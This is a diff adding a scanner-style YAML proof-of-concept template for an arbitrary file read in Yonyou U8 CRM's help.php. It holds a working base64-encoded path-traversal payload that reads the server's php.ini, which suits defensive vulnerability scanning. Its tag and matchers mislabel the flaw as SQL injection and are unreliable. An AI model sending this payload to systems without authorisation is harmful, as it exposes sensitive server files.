@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-u8-crm-help-php-anyfile-read
+info:
+  name: 用友U8 CRM客户关系管理系统 help.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友U8 CRM客户关系管理系统存在一个任意文件读取漏洞，通过 `help.php` 文件可以读取敏感文件。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "allow_url_fopen"
+          - "SQL SERVER  Error"
+          - "allow_url_include"
+          - "About php.ini"
+        condition: and
